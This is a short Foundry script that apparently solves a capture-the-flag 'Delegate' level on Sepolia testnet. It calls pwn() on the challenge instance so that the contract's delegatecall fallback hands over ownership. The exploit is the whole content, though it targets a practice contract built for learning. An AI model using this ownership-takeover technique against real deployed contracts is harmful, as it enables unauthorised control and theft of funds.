//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/DelegateSolution.sol";
import "../src/Delegate.sol";
import "../src/utils/SepoliaInstances.sol";

contract DelegateScript is Script, SepoliaInstances {

    function run() public {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        (bool success, bytes memory result) = delegateInstance.call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();

    }
}